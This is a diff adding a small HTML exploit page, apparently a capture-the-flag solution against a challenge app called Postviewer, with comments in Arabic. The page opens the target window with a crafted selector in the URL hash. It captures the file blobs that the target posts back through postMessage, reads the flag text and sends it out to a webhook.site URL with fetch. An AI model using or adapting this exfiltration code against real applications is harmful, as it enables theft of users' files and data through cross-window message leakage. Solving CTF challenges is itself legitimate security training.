@@ -1,0 +1,29 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Postviewer v5² stealer</title>
+<script>
+(async () => {
+  /* 1. افتح Postviewer مع سيلكتور يحيل على أول عنصر (عادة flag.txt) */
+  const win = window.open(
+    'http://localhost:1338/#a,.list-group-item:nth-child(1)',
+    '_blank'
+  );
+
+  /* 2. التقط كل الرسائل القادمة من تلك النافذة */
+  window.addEventListener('message', async (e) => {
+    if (!e.data?.files) return;                 // ليس ما نريد
+    const blob = e.data.files[0]?.blob;
+    if (!blob) return;
+
+    /* 3. استخرج نص العلم */
+    const flag = await blob.text();
+
+    /* 4. أرسله إلى Webhook أو اطبعه بالكونسول */
+    fetch('https://webhook.site/dd1b22f1-4217-44e2-a142-ce1825ed0b23?flag=' + encodeURIComponent(flag));
+    console.log('[+] FLAG =', flag);
+  });
+
+  /* 5. اختياري: عطل التبويب بعد 10 ث ليبقى الـ blob موجود */
+  setTimeout(() => win?.close?.(), 10_000);
+})();
+</script>
